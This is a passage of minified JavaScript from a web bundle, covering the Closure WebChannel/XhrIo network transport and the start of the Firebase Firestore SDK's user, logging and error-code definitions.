RTT: "+P.T+"ms")),O=P;var Ie=g;if(O.na=om(O,O.L?O.ba:null,O.W),Ie.L){uu(O.h,Ie);var Ze=Ie,Xa=O.O;Xa&&(Ze.H=Xa),Ze.D&&(qi(Ze),_i(Ze)),O.g=Ie}else em(O);P.i.length>0&&Hi(P)}else Ca[0]!="stop"&&Ca[0]!="close"||Gi(P,7);else P.I==3&&(Ca[0]=="stop"||Ca[0]=="close"?Ca[0]=="stop"?Gi(P,7):yu(P):Ca[0]!="noop"&&P.l&&P.l.qa(Ca),P.A=0)}}wi(4)}catch{}}var ot=class{constructor(g,T){this.g=g,this.map=T}};function ru(g){this.l=g||10,l.PerformanceNavigationTiming?(g=l.performance.getEntriesByType("navigation"),g=g.length>0&&(g[0].nextHopProtocol=="hq"||g[0].nextHopProtocol=="h2")):g=!!(l.chrome&&l.chrome.loadTimes&&l.chrome.loadTimes()&&l.chrome.loadTimes().wasFetchedViaSpdy),this.j=g?this.l:1,this.g=null,this.j>1&&(this.g=new Set),this.h=null,this.i=[]}function lu(g){return g.h?!0:g.g?g.g.size>=g.j:!1}function Oi(g){return g.h?1:g.g?g.g.size:0}function Ui(g,T){return g.h?g.h==T:g.g?g.g.has(T):!1}function cu(g,T){g.g?g.g.add(T):g.h=T}function uu(g,T){g.h&&g.h==T?g.h=null:g.g&&g.g.has(T)&&g.g.delete(T)}ru.prototype.cancel=function(){if(this.i=du(this),this.h)this.h.cancel(),this.h=null;else if(this.g&&this.g.size!==0){for(const g of this.g.values())g.cancel();this.g.clear()}};function du(g){if(g.h!=null)return g.i.concat(g.h.G);if(g.g!=null&&g.g.size!==0){let T=g.i;for(const P of g.g.values())T=T.concat(P.G);return T}return C(g.i)}var Wp=RegExp("^(?:([^:/?#.]+):)?(?://(?:([^\\\\/?#]*)@)?([^\\\\/?#]*?)(?::([0-9]+))?(?=[\\\\/?#]|$))?([^?#]+)?(?:\\?([^#]*))?(?:#([\\s\\S]*))?$");function yl(g,T){if(g){g=g.split("&");for(let P=0;P<g.length;P++){const O=g[P].indexOf("=");let te,le=null;O>=0?(te=g[P].substring(0,O),le=g[P].substring(O+1)):te=g[P],T(te,le?decodeURIComponent(le.replace(/\+/g," ")):"")}}}function En(g){this.g=this.o=this.j="",this.u=null,this.m=this.h="",this.l=!1;let T;g instanceof En?(this.l=g.l,xt(this,g.j),this.o=g.o,this.g=g.g,es(this,g.u),this.h=g.h,pu(this,Xp(g.i)),this.m=g.m):g&&(T=String(g).match(Wp))?(this.l=!1,xt(this,T[1]||"",!0),this.o=zi(T[2]||""),this.g=zi(T[3]||"",!0),es(this,T[4]),this.h=zi(T[5]||"",!0),pu(this,T[6]||"",!0),this.m=zi(T[7]||"")):(this.l=!1,this.i=new ts(null,this.l))}En.prototype.toString=function(){const g=[];var T=this.j;T&&g.push(gr(T,El,!0),":");var P=this.g;return(P||T=="file")&&(g.push("//"),(T=this.o)&&g.push(gr(T,El,!0),"@"),g.push(ho(P).replace(/%25([0-9a-fA-F]{2})/g,"%$1")),P=this.u,P!=null&&g.push(":",String(P))),(P=this.h)&&(this.g&&P.charAt(0)!="/"&&g.push("/"),g.push(gr(P,P.charAt(0)=="/"?mu:Kp,!0))),(P=this.i.toString())&&g.push("?",P),(P=this.m)&&g.push("#",gr(P,Yp)),g.join("")},En.prototype.resolve=function(g){const T=st(this);let P=!!g.j;P?xt(T,g.j):P=!!g.o,P?T.o=g.o:P=!!g.g,P?T.g=g.g:P=g.u!=null;var O=g.h;if(P)es(T,g.u);else if(P=!!g.h){if(O.charAt(0)!="/")if(this.g&&!this.h)O="/"+O;else{var te=T.h.lastIndexOf("/");te!=-1&&(O=T.h.slice(0,te+1)+O)}if(te=O,te==".."||te==".")O="";else if(te.indexOf("./")!=-1||te.indexOf("/.")!=-1){O=te.lastIndexOf("/",0)==0,te=te.split("/");const le=[];for(let Ie=0;Ie<te.length;){const Ze=te[Ie++];Ze=="."?O&&Ie==te.length&&le.push(""):Ze==".."?((le.length>1||le.length==1&&le[0]!="")&&le.pop(),O&&Ie==te.length&&le.push("")):(le.push(Ze),O=!0)}O=le.join("/")}else O=te}return P?T.h=O:P=g.i.toString()!=="",P?pu(T,Xp(g.i)):P=!!g.m,P&&(T.m=g.m),T};function st(g){return new En(g)}function xt(g,T,P){g.j=P?zi(T,!0):T,g.j&&(g.j=g.j.replace(/:$/,""))}function es(g,T){if(T){if(T=Number(T),isNaN(T)||T<0)throw Error("Bad port number "+T);g.u=T}else g.u=null}function pu(g,T,P){T instanceof ts?(g.i=T,Cl(g.i,g.l)):(P||(T=gr(T,as)),g.i=new ts(T,g.l))}function Pa(g,T,P){g.i.set(T,P)}function hr(g){return Pa(g,"zx",Math.floor(Math.random()*2147483648).toString(36)+Math.abs(Math.floor(Math.random()*2147483648)^Date.now()).toString(36)),g}function zi(g,T){return g?T?decodeURI(g.replace(/%25/g,"%2525")):decodeURIComponent(g):""}function gr(g,T,P){return typeof g=="string"?(g=encodeURI(g).replace(T,sn),P&&(g=g.replace(/%25([0-9a-fA-F]{2})/g,"%$1")),g):null}function sn(g){return g=g.charCodeAt(0),"%"+(g>>4&15).toString(16)+(g&15).toString(16)}var El=/[#\/\?@]/g,Kp=/[#\?:]/g,mu=/[#\?]/g,as=/[#\?@]/g,Yp=/#/g;function ts(g,T){this.h=this.g=null,this.i=g||null,this.j=!!T}function rn(g){g.g||(g.g=new Map,g.h=0,g.i&&yl(g.i,function(T,P){g.add(decodeURIComponent(T.replace(/\+/g," ")),P)}))}a=ts.prototype,a.add=function(g,T){rn(this),this.i=null,g=ns(this,g);let P=this.g.get(g);return P||this.g.set(g,P=[]),P.push(T),this.h+=1,this};function $p(g,T){rn(g),T=ns(g,T),g.g.has(T)&&(g.i=null,g.h-=g.g.get(T).length,g.g.delete(T))}function fu(g,T){return rn(g),T=ns(g,T),g.g.has(T)}a.forEach=function(g,T){rn(this),this.g.forEach(function(P,O){P.forEach(function(te){g.call(T,te,O,this)},this)},this)};function hu(g,T){rn(g);let P=[];if(typeof T=="string")fu(g,T)&&(P=P.concat(g.g.get(ns(g,T))));else for(g=Array.from(g.g.values()),T=0;T<g.length;T++)P=P.concat(g[T]);return P}a.set=function(g,T){return rn(this),this.i=null,g=ns(this,g),fu(this,g)&&(this.h-=this.g.get(g).length),this.g.set(g,[T]),this.h+=1,this},a.get=function(g,T){return g?(g=hu(this,g),g.length>0?String(g[0]):T):T};function Sl(g,T,P){$p(g,T),P.length>0&&(g.i=null,g.g.set(ns(g,T),C(P)),g.h+=P.length)}a.toString=function(){if(this.i)return this.i;if(!this.g)return"";const g=[],T=Array.from(this.g.keys());for(let O=0;O<T.length;O++){var P=T[O];const te=ho(P);P=hu(this,P);for(let le=0;le<P.length;le++){let Ie=te;P[le]!==""&&(Ie+="="+ho(P[le])),g.push(Ie)}}return this.i=g.join("&")};function Xp(g){const T=new ts;return T.i=g.i,g.g&&(T.g=new Map(g.g),T.h=g.h),T}function ns(g,T){return T=String(T),g.j&&(T=T.toLowerCase()),T}function Cl(g,T){T&&!g.j&&(rn(g),g.i=null,g.g.forEach(function(P,O){const te=O.toLowerCase();O!=te&&($p(this,O),Sl(this,te,P))},g)),g.j=T}function ri(g,T){const P=new ii;if(l.Image){const O=new Image;O.onload=f(qn,P,"TestLoadImage: loaded",!0,T,O),O.onerror=f(qn,P,"TestLoadImage: error",!1,T,O),O.onabort=f(qn,P,"TestLoadImage: abort",!1,T,O),O.ontimeout=f(qn,P,"TestLoadImage: timeout",!1,T,O),l.setTimeout(function(){O.ontimeout&&O.ontimeout()},1e4),O.src=g}else T(!1)}function gu(g,T){const P=new ii,O=new AbortController,te=setTimeout(()=>{O.abort(),qn(P,"TestPingServer: timeout",!1,T)},1e4);fetch(g,{signal:O.signal}).then(le=>{clearTimeout(te),le.ok?qn(P,"TestPingServer: ok",!0,T):qn(P,"TestPingServer: server error",!1,T)}).catch(()=>{clearTimeout(te),qn(P,"TestPingServer: error",!1,T)})}function qn(g,T,P,O,te){try{te&&(te.onload=null,te.onerror=null,te.onabort=null,te.ontimeout=null),O(P)}catch{}}function is(){this.g=new we}function Bi(g){this.i=g.Sb||null,this.h=g.ab||!1}h(Bi,Ae),Bi.prototype.g=function(){return new br(this.i,this.h)};function br(g,T){qa.call(this),this.H=g,this.o=T,this.m=void 0,this.status=this.readyState=0,this.responseType=this.responseText=this.response=this.statusText="",this.onreadystatechange=null,this.A=new Headers,this.h=null,this.F="GET",this.D="",this.g=!1,this.B=this.j=this.l=null,this.v=new AbortController}h(br,qa),a=br.prototype,a.open=function(g,T){if(this.readyState!=0)throw this.abort(),Error("Error reopening a connection");this.F=g,this.D=T,this.readyState=1,li(this)},a.send=function(g){if(this.readyState!=1)throw this.abort(),Error("need to call open() first. ");if(this.v.signal.aborted)throw this.abort(),Error("Request was aborted.");this.g=!0;const T={headers:this.A,method:this.F,credentials:this.m,cache:void 0,signal:this.v.signal};g&&(T.body=g),(this.H||l).fetch(new Request(this.D,T)).then(this.Pa.bind(this),this.ga.bind(this))},a.abort=function(){this.response=this.responseText="",this.A=new Headers,this.status=0,this.v.abort(),this.j&&this.j.cancel("Request was aborted.").catch(()=>{}),this.readyState>=1&&this.g&&this.readyState!=4&&(this.g=!1,os(this)),this.readyState=0},a.Pa=function(g){if(this.g&&(this.l=g,this.h||(this.status=this.l.status,this.statusText=this.l.statusText,this.h=g.headers,this.readyState=2,li(this)),this.g&&(this.readyState=3,li(this),this.g)))if(this.responseType==="arraybuffer")g.arrayBuffer().then(this.Na.bind(this),this.ga.bind(this));else if(typeof l.ReadableStream<"u"&&"body"in g){if(this.j=g.body.getReader(),this.o){if(this.responseType)throw Error('responseType must be empty for "streamBinaryChunks" mode responses.');this.response=[]}else this.response=this.responseText="",this.B=new TextDecoder;Tl(this)}else g.text().then(this.Oa.bind(this),this.ga.bind(this))};function Tl(g){g.j.read().then(g.Ma.bind(g)).catch(g.ga.bind(g))}a.Ma=function(g){if(this.g){if(this.o&&g.value)this.response.push(g.value);else if(!this.o){var T=g.value?g.value:new Uint8Array(0);(T=this.B.decode(T,{stream:!g.done}))&&(this.response=this.responseText+=T)}g.done?os(this):li(this),this.readyState==3&&Tl(this)}},a.Oa=function(g){this.g&&(this.response=this.responseText=g,os(this))},a.Na=function(g){this.g&&(this.response=g,os(this))},a.ga=function(){this.g&&os(this)};function os(g){g.readyState=4,g.l=null,g.j=null,g.B=null,li(g)}a.setRequestHeader=function(g,T){this.A.append(g,T)},a.getResponseHeader=function(g){return this.h&&this.h.get(g.toLowerCase())||""},a.getAllResponseHeaders=function(){if(!this.h)return"";const g=[],T=this.h.entries();for(var P=T.next();!P.done;)P=P.value,g.push(P[0]+": "+P[1]),P=T.next();return g.join(`\r
`)};function li(g){g.onreadystatechange&&g.onreadystatechange.call(g)}Object.defineProperty(br.prototype,"withCredentials",{get:function(){return this.m==="include"},set:function(g){this.m=g?"include":"same-origin"}});function kn(g){let T="";return je(g,function(P,O){T+=O,T+=":",T+=P,T+=`\r
`}),T}function vr(g,T,P){e:{for(O in P){var O=!1;break e}O=!0}O||(P=kn(P),typeof g=="string"?P!=null&&ho(P):Pa(g,T,P))}function Ia(g){qa.call(this),this.headers=new Map,this.L=g||null,this.h=!1,this.g=null,this.D="",this.o=0,this.l="",this.j=this.B=this.v=this.A=!1,this.m=null,this.F="",this.H=!1}h(Ia,qa);var Fi=/^https?$/i,bu=["POST","PUT"];a=Ia.prototype,a.Fa=function(g){this.H=g},a.ea=function(g,T,P,O){if(this.g)throw Error("[goog.net.XhrIo] Object is active with another request="+this.D+"; newUri="+g);T=T?T.toUpperCase():"GET",this.D=g,this.l="",this.o=0,this.A=!1,this.h=!0,this.g=this.L?this.L.g():su.g(),this.g.onreadystatechange=E(p(this.Ca,this));try{this.B=!0,this.g.open(T,String(g),!0),this.B=!1}catch(le){yr(this,le);return}if(g=P||"",P=new Map(this.headers),O)if(Object.getPrototypeOf(O)===Object.prototype)for(var te in O)P.set(te,O[te]);else if(typeof O.keys=="function"&&typeof O.get=="function")for(const le of O.keys())P.set(le,O.get(le));else throw Error("Unknown input type for opt_headers: "+String(O));O=Array.from(P.keys()).find(le=>le.toLowerCase()=="content-type"),te=l.FormData&&g instanceof l.FormData,!(Array.prototype.indexOf.call(bu,T,void 0)>=0)||O||te||P.set("Content-Type","application/x-www-form-urlencoded;charset=utf-8");for(const[le,Ie]of P)this.g.setRequestHeader(le,Ie);this.F&&(this.g.responseType=this.F),"withCredentials"in this.g&&this.g.withCredentials!==this.H&&(this.g.withCredentials=this.H);try{this.m&&(clearTimeout(this.m),this.m=null),this.v=!0,this.g.send(g),this.v=!1}catch(le){yr(this,le)}};function yr(g,T){g.h=!1,g.g&&(g.j=!0,g.g.abort(),g.j=!1),g.l=T,g.o=5,vu(g),go(g)}function vu(g){g.A||(g.A=!0,za(g,"complete"),za(g,"error"))}a.abort=function(g){this.g&&this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1,this.o=g||7,za(this,"complete"),za(this,"abort"),go(this))},a.N=function(){this.g&&(this.h&&(this.h=!1,this.j=!0,this.g.abort(),this.j=!1),go(this,!0)),Ia.Z.N.call(this)},a.Ca=function(){this.u||(this.B||this.v||this.j?Er(this):this.Xa())},a.Xa=function(){Er(this)};function Er(g){if(g.h&&typeof r<"u"){if(g.v&&ci(g)==4)setTimeout(g.Ca.bind(g),0);else if(za(g,"readystatechange"),ci(g)==4){g.h=!1;try{const le=g.ca();e:switch(le){case 200:case 201:case 202:case 204:case 206:case 304:case 1223:var T=!0;break e;default:T=!1}var P;if(!(P=T)){var O;if(O=le===0){let Ie=String(g.D).match(Wp)[1]||null;!Ie&&l.self&&l.self.location&&(Ie=l.self.location.protocol.slice(0,-1)),O=!Fi.test(Ie?Ie.toLowerCase():"")}P=O}if(P)za(g,"complete"),za(g,"success");else{g.o=6;try{var te=ci(g)>2?g.g.statusText:""}catch{te=""}g.l=te+" ["+g.ca()+"]",vu(g)}}finally{go(g)}}}}function go(g,T){if(g.g){g.m&&(clearTimeout(g.m),g.m=null);const P=g.g;g.g=null,T||za(g,"ready");try{P.onreadystatechange=null}catch{}}}a.isActive=function(){return!!this.g};function ci(g){return g.g?g.g.readyState:0}a.ca=function(){try{return ci(this)>2?this.g.status:-1}catch{return-1}},a.la=function(){try{return this.g?this.g.responseText:""}catch{return""}},a.La=function(g){if(this.g){var T=this.g.responseText;return g&&T.indexOf(g)==0&&(T=T.substring(g.length)),ye(T)}};function Dt(g){try{if(!g.g)return null;if("response"in g.g)return g.g.response;switch(g.F){case"":case"text":return g.g.responseText;case"arraybuffer":if("mozResponseArrayBuffer"in g.g)return g.g.mozResponseArrayBuffer}return null}catch{return null}}function bo(g){const T={};g=(g.g&&ci(g)>=2&&g.g.getAllResponseHeaders()||"").split(`\r
`);for(let O=0;O<g.length;O++){if(F(g[O]))continue;var P=Gp(g[O]);const te=P[0];if(P=P[1],typeof P!="string")continue;P=P.trim();const le=T[te]||[];T[te]=le,le.push(P)}G(T,function(O){return O.join(", ")})}a.ya=function(){return this.o},a.Ha=function(){return typeof this.l=="string"?this.l:String(this.l)};function Vi(g,T,P){return P&&P.internalChannelParams&&P.internalChannelParams[g]||T}function ss(g){this.za=0,this.i=[],this.j=new ii,this.ba=this.na=this.J=this.W=this.g=this.wa=this.G=this.H=this.u=this.U=this.o=null,this.Ya=this.V=0,this.Sa=Vi("failFast",!1,g),this.F=this.C=this.v=this.m=this.l=null,this.X=!0,this.xa=this.K=-1,this.Y=this.A=this.D=0,this.Qa=Vi("baseRetryDelayMs",5e3,g),this.Za=Vi("retryDelaySeedMs",1e4,g),this.Ta=Vi("forwardChannelMaxRetries",2,g),this.va=Vi("forwardChannelRequestTimeoutMs",2e4,g),this.ma=g&&g.xmlHttpFactory||void 0,this.Ua=g&&g.Rb||void 0,this.Aa=g&&g.useFetchStreams||!1,this.O=void 0,this.L=g&&g.supportsCrossDomainXhr||!1,this.M="",this.h=new ru(g&&g.concurrentRequestLimit),this.Ba=new is,this.S=g&&g.fastHandshake||!1,this.R=g&&g.encodeInitMessageHeaders||!1,this.S&&this.R&&(this.R=!1),this.Ra=g&&g.Pb||!1,g&&g.ua&&this.j.ua(),g&&g.forceLongPolling&&(this.X=!1),this.aa=!this.S&&this.X&&g&&g.detectBufferingProxy||!1,this.ia=void 0,g&&g.longPollingTimeout&&g.longPollingTimeout>0&&(this.ia=g.longPollingTimeout),this.ta=void 0,this.T=0,this.P=!1,this.ja=this.B=null}a=ss.prototype,a.ka=8,a.I=1,a.connect=function(g,T,P,O){nt(0),this.W=g,this.H=T||{},P&&O!==void 0&&(this.H.OSID=P,this.H.OAID=O),this.F=this.X,this.J=om(this,null,this.W),Hi(this)};function yu(g){if(xl(g),g.I==3){var T=g.V++,P=st(g.J);if(Pa(P,"SID",g.M),Pa(P,"RID",T),Pa(P,"TYPE","terminate"),Sr(g,P),T=new oi(g,g.j,T),T.M=2,T.A=hr(st(P)),P=!1,l.navigator&&l.navigator.sendBeacon)try{P=l.navigator.sendBeacon(T.A.toString(),"")}catch{}!P&&l.Image&&(new Image().src=T.A,P=!0),P||(T.g=sm(T.j,null),T.g.ea(T.A)),T.F=Date.now(),_i(T)}im(g)}function rs(g){g.g&&(Su(g),g.g.cancel(),g.g=null)}function xl(g){rs(g),g.v&&(l.clearTimeout(g.v),g.v=null),Pl(g),g.h.cancel(),g.m&&(typeof g.m=="number"&&l.clearTimeout(g.m),g.m=null)}function Hi(g){if(!lu(g.h)&&!g.m){g.m=!0;var T=g.Ea;ee||M(),Q||(ee(),Q=!0),q.add(T,g),g.D=0}}function Al(g,T){return Oi(g.h)>=g.h.j-(g.m?1:0)?!1:g.m?(g.i=T.G.concat(g.i),!0):g.I==1||g.I==2||g.D>=(g.Sa?0:g.Ta)?!1:(g.m=Di(p(g.Ea,g,T),nm(g,g.D)),g.D++,!0)}a.Ea=function(g){if(this.m)if(this.m=null,this.I==1){if(!g){this.V=Math.floor(Math.random()*1e5),g=this.V++;const te=new oi(this,this.j,g);let le=this.o;if(this.U&&(le?(le=J(le),B(le,this.U)):le=this.U),this.u!==null||this.R||(te.J=le,le=null),this.S)e:{for(var T=0,P=0;P<this.i.length;P++){a:{var O=this.i[P];if("__data__"in O.map&&(O=O.map.__data__,typeof O=="string")){O=O.length;break a}O=void 0}if(O===void 0)break;if(T+=O,T>4096){T=P;break e}if(T===4096||P===this.i.length-1){T=P+1;break e}}T=1e3}else T=1e3;T=Zp(this,te,T),P=st(this.J),Pa(P,"RID",g),Pa(P,"CVER",22),this.G&&Pa(P,"X-HTTP-Session-Id",this.G),Sr(this,P),le&&(this.R?T="headers="+ho(kn(le))+"&"+T:this.u&&vr(P,this.u,le)),cu(this.h,te),this.Ra&&Pa(P,"TYPE","init"),this.S?(Pa(P,"$req",T),Pa(P,"SID","null"),te.U=!0,Ni(te,P,null)):Ni(te,P,T),this.I=2}}else this.I==3&&(g?Eu(this,g):this.i.length==0||lu(this.h)||Eu(this))};function Eu(g,T){var P;T?P=T.l:P=g.V++;const O=st(g.J);Pa(O,"SID",g.M),Pa(O,"RID",P),Pa(O,"AID",g.K),Sr(g,O),g.u&&g.o&&vr(O,g.u,g.o),P=new oi(g,g.j,P,g.D+1),g.u===null&&(P.J=g.o),T&&(g.i=T.G.concat(g.i)),T=Zp(g,P,1e3),P.H=Math.round(g.va*.5)+Math.round(g.va*.5*Math.random()),cu(g.h,P),Ni(P,O,T)}function Sr(g,T){g.H&&je(g.H,function(P,O){Pa(T,O,P)}),g.l&&je({},function(P,O){Pa(T,O,P)})}function Zp(g,T,P){P=Math.min(g.i.length,P);const O=g.l?p(g.l.Ka,g.l,g):null;e:{var te=g.i;let Ze=-1;for(;;){const Xa=["count="+P];Ze==-1?P>0?(Ze=te[0].g,Xa.push("ofs="+Ze)):Ze=0:Xa.push("ofs="+Ze);let Ca=!0;for(let Fa=0;Fa<P;Fa++){var le=te[Fa].g;const On=te[Fa].map;if(le-=Ze,le<0)Ze=Math.max(0,te[Fa].g-100),Ca=!1;else try{le="req"+le+"_"||"";try{var Ie=On instanceof Map?On:Object.entries(On);for(const[Qi,ui]of Ie){let di=ui;u(ui)&&(di=X(ui)),Xa.push(le+Qi+"="+encodeURIComponent(di))}}catch(Qi){throw Xa.push(le+"type="+encodeURIComponent("_badmap")),Qi}}catch{O&&O(On)}}if(Ca){Ie=Xa.join("&");break e}}Ie=void 0}return g=g.i.splice(0,P),T.G=g,Ie}function em(g){if(!g.g&&!g.v){g.Y=1;var T=g.Da;ee||M(),Q||(ee(),Q=!0),q.add(T,g),g.A=0}}function Cr(g){return g.g||g.v||g.A>=3?!1:(g.Y++,g.v=Di(p(g.Da,g),nm(g,g.A)),g.A++,!0)}a.Da=function(){if(this.v=null,am(this),this.aa&&!(this.P||this.g==null||this.T<=0)){var g=4*this.T;this.j.info("BP detection timer enabled: "+g),this.B=Di(p(this.Wa,this),g)}},a.Wa=function(){this.B&&(this.B=null,this.j.info("BP detection timeout reached."),this.j.info("Buffering proxy detected and switch to long-polling!"),this.F=!1,this.P=!0,nt(10),rs(this),am(this))};function Su(g){g.B!=null&&(l.clearTimeout(g.B),g.B=null)}function am(g){g.g=new oi(g,g.j,"rpc",g.Y),g.u===null&&(g.g.J=g.o),g.g.P=0;var T=st(g.na);Pa(T,"RID","rpc"),Pa(T,"SID",g.M),Pa(T,"AID",g.K),Pa(T,"CI",g.F?"0":"1"),!g.F&&g.ia&&Pa(T,"TO",g.ia),Pa(T,"TYPE","xmlhttp"),Sr(g,T),g.u&&g.o&&vr(T,g.u,g.o),g.O&&(g.g.H=g.O);var P=g.g;g=g.ba,P.M=1,P.A=hr(st(T)),P.u=null,P.R=!0,bl(P,g)}a.Va=function(){this.C!=null&&(this.C=null,rs(this),Cr(this),nt(19))};function Pl(g){g.C!=null&&(l.clearTimeout(g.C),g.C=null)}function tm(g,T){var P=null;if(g.g==T){Pl(g),Su(g),g.g=null;var O=2}else if(Ui(g.h,T))P=T.G,uu(g.h,T),O=1;else return;if(g.I!=0){if(T.o)if(O==1){P=T.u?T.u.length:0,T=Date.now()-T.F;var te=g.D;O=Ct(),za(O,new ji(O,P)),Hi(g)}else em(g);else if(te=T.m,te==3||te==0&&T.X>0||!(O==1&&Al(g,T)||O==2&&Cr(g)))switch(P&&P.length>0&&(T=g.h,T.i=T.i.concat(P)),te){case 1:Gi(g,5);break;case 4:Gi(g,10);break;case 3:Gi(g,6);break;default:Gi(g,2)}}}function nm(g,T){let P=g.Qa+Math.floor(Math.random()*g.Za);return g.isActive()||(P*=2),P*T}function Gi(g,T){if(g.j.info("Error code "+T),T==2){var P=p(g.bb,g),O=g.Ua;const te=!O;O=new En(O||"//www.google.com/images/cleardot.gif"),l.location&&l.location.protocol=="http"||xt(O,"https"),hr(O),te?ri(O.toString(),P):gu(O.toString(),P)}else nt(2);g.I=0,g.l&&g.l.pa(T),im(g),xl(g)}a.bb=function(g){g?(this.j.info("Successfully pinged google.com"),nt(2)):(this.j.info("Failed to ping google.com"),nt(1))};function im(g){if(g.I=0,g.ja=[],g.l){const T=du(g.h);(T.length!=0||g.i.length!=0)&&(A(g.ja,T),A(g.ja,g.i),g.h.i.length=0,C(g.i),g.i.length=0),g.l.oa()}}function om(g,T,P){var O=P instanceof En?st(P):new En(P);if(O.g!="")T&&(O.g=T+"."+O.g),es(O,O.u);else{var te=l.location;O=te.protocol,T=T?T+"."+te.hostname:te.hostname,te=+te.port;const le=new En(null);O&&xt(le,O),T&&(le.g=T),te&&es(le,te),P&&(le.h=P),O=le}return P=g.G,T=g.wa,P&&T&&Pa(O,P,T),Pa(O,"VER",g.ka),Sr(g,O),O}function sm(g,T,P){if(T&&!g.L)throw Error("Can't create secondary domain capable XhrIo object.");return T=g.Aa&&!g.ma?new Ia(new Bi({ab:P})):new Ia(g.ma),T.Fa(g.L),T}a.isActive=function(){return!!this.l&&this.l.isActive(this)};function rm(){}a=rm.prototype,a.ra=function(){},a.qa=function(){},a.pa=function(){},a.oa=function(){},a.isActive=function(){return!0},a.Ka=function(){};function ls(){}ls.prototype.g=function(g,T){return new Kt(g,T)};function Kt(g,T){qa.call(this),this.g=new ss(T),this.l=g,this.h=T&&T.messageUrlParams||null,g=T&&T.messageHeaders||null,T&&T.clientProtocolHeaderRequired&&(g?g["X-Client-Protocol"]="webchannel":g={"X-Client-Protocol":"webchannel"}),this.g.o=g,g=T&&T.initMessageHeaders||null,T&&T.messageContentType&&(g?g["X-WebChannel-Content-Type"]=T.messageContentType:g={"X-WebChannel-Content-Type":T.messageContentType}),T&&T.sa&&(g?g["X-WebChannel-Client-Profile"]=T.sa:g={"X-WebChannel-Client-Profile":T.sa}),this.g.U=g,(g=T&&T.Qb)&&!F(g)&&(this.g.u=g),this.A=T&&T.supportsCrossDomainXhr||!1,this.v=T&&T.sendRawJson||!1,(T=T&&T.httpSessionIdParam)&&!F(T)&&(this.g.G=T,g=this.h,g!==null&&T in g&&(g=this.h,T in g&&delete g[T])),this.j=new vo(this)}h(Kt,qa),Kt.prototype.m=function(){this.g.l=this.j,this.A&&(this.g.L=!0),this.g.connect(this.l,this.h||void 0)},Kt.prototype.close=function(){yu(this.g)},Kt.prototype.o=function(g){var T=this.g;if(typeof g=="string"){var P={};P.__data__=g,g=P}else this.v&&(P={},P.__data__=X(g),g=P);T.i.push(new ot(T.Ya++,g)),T.I==3&&Hi(T)},Kt.prototype.N=function(){this.g.l=null,delete this.j,yu(this.g),delete this.g,Kt.Z.N.call(this)};function lm(g){ra.call(this),g.__headers__&&(this.headers=g.__headers__,this.statusCode=g.__status__,delete g.__headers__,delete g.__status__);var T=g.__sm__;if(T){e:{for(const P in T){g=P;break e}g=void 0}(this.i=g)&&(g=this.i,T=T!==null&&g in T?T[g]:void 0),this.data=T}else this.data=g}h(lm,ra);function cm(){ya.call(this),this.status=1}h(cm,ya);function vo(g){this.g=g}h(vo,rm),vo.prototype.ra=function(){za(this.g,"a")},vo.prototype.qa=function(g){za(this.g,new lm(g))},vo.prototype.pa=function(g){za(this.g,new cm)},vo.prototype.oa=function(){za(this.g,"b")},ls.prototype.createWebChannel=ls.prototype.g,Kt.prototype.send=Kt.prototype.o,Kt.prototype.open=Kt.prototype.m,Kt.prototype.close=Kt.prototype.close,LI=function(){return new ls},PI=function(){return Ct()},AI=We,Yy={jb:0,mb:1,nb:2,Hb:3,Mb:4,Jb:5,Kb:6,Ib:7,Gb:8,Lb:9,PROXY:10,NOPROXY:11,Eb:12,Ab:13,Bb:14,zb:15,Cb:16,Db:17,fb:18,eb:19,gb:20},mr.NO_ERROR=0,mr.TIMEOUT=8,mr.HTTP_ERROR=6,Nf=mr,ou.COMPLETE="complete",xI=ou,Qe.EventType=ma,ma.OPEN="a",ma.CLOSE="b",ma.ERROR="c",ma.MESSAGE="d",qa.prototype.listen=qa.prototype.J,yd=Qe,Ia.prototype.listenOnce=Ia.prototype.K,Ia.prototype.getLastError=Ia.prototype.Ha,Ia.prototype.getLastErrorCode=Ia.prototype.ya,Ia.prototype.getStatus=Ia.prototype.ca,Ia.prototype.getResponseJson=Ia.prototype.La,Ia.prototype.getResponseText=Ia.prototype.la,Ia.prototype.send=Ia.prototype.ea,Ia.prototype.setWithCredentials=Ia.prototype.Fa,TI=Ia}).apply(typeof hf<"u"?hf:typeof self<"u"?self:typeof window<"u"?window:{});let Vt=class{constructor(e){this.uid=e}isAuthenticated(){return this.uid!=null}toKey(){return this.isAuthenticated()?"uid:"+this.uid:"anonymous-user"}isEqual(e){return e.uid===this.uid}};Vt.UNAUTHENTICATED=new Vt(null),Vt.GOOGLE_CREDENTIALS=new Vt("google-credentials-uid"),Vt.FIRST_PARTY=new Vt("first-party-uid"),Vt.MOCK_USER=new Vt("mock-user");let Fc="12.9.0";function s5(a){Fc=a}const ol=new mE("@firebase/firestore");function lc(){return ol.logLevel}function De(a,...e){if(ol.logLevel<=ua.DEBUG){const t=e.map(gE);ol.debug(`Firestore (${Fc}): ${a}`,...t)}}function Jo(a,...e){if(ol.logLevel<=ua.ERROR){const t=e.map(gE);ol.error(`Firestore (${Fc}): ${a}`,...t)}}function sl(a,...e){if(ol.logLevel<=ua.WARN){const t=e.map(gE);ol.warn(`Firestore (${Fc}): ${a}`,...t)}}function gE(a){if(typeof a=="string")return a;try{return(function(t){return JSON.stringify(t)})(a)}catch{return a}}function Ge(a,e,t){let n="Unexpected state";typeof e=="string"?n=e:t=e,RI(a,n,t)}function RI(a,e,t){let n=`FIRESTORE (${Fc}) INTERNAL ASSERTION FAILED: ${e} (ID: ${a.toString(16)})`;if(t!==void 0)try{n+=" CONTEXT: "+JSON.stringify(t)}catch{n+=" CONTEXT: "+t}throw Jo(n),new Error(n)}function Aa(a,e,t,n){let i="Unexpected state";typeof t=="string"?i=t:n=t,a||RI(e,i,n)}function $e(a,e){return a}const Se={OK:"ok",CANCELLED:"cancelled",UNKNOWN:"unknown",INVALID_ARGUMENT:"invalid-argument",DEADLINE_EXCEEDED:"deadline-exceeded",NOT_FOUND:"not-found",ALREADY_EXISTS:"already-exists",PERMISSION_DENIED:"permission-denied",UNAUTHENTICATED:"unauthenticated",RESOURCE_EXHAUSTED:"resource-exhausted",FAILED_PRECONDITION:"failed-precondition",ABORTED:"aborted",OUT_OF_RANGE:"out-of-range",UNIMPLEMENTED:"unimplemented",INTERNAL:"internal",UNAVAILABLE:"unavailable",DATA_LOSS:"data-loss"};class ke extends Xo{constructor(e,t){super(e,t),this.code=e,this.message=t,this.toString=()=>`${this.name}: [code=${this.code}]: ${this.message}`}}class Ws{constructor(){this.promise=new Promise(((e,t)=>{this.resolve=e,this.reject=t}))}}class 